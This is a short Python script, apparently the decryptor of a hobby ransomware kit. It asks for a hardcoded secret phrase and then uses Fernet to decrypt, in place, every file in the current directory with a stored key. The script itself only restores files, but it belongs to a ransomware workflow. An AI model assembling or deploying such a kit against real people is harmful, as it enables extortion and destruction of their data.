#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "Ransomware.py" or file == "thekey.key" or file == "RansomwareD.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

secretphrase = "Vltr93ncrypt10n"

user = input("Enter the secret phrase: ")

if user == secretphrase:
    with open("thekey.key","rb") as key:
        secretkey = key.read()

    for file in files:
        with open(file,"rb") as thefile:
            content = thefile.read()
            content_decrypted = Fernet(secretkey).decrypt(content)
            with open(file,"wb") as thefile:
                content = thefile.write(content_decrypted)
    print("Files successfully Decrypted!!!")
else:
    print("Incorrect secret phrase!!!")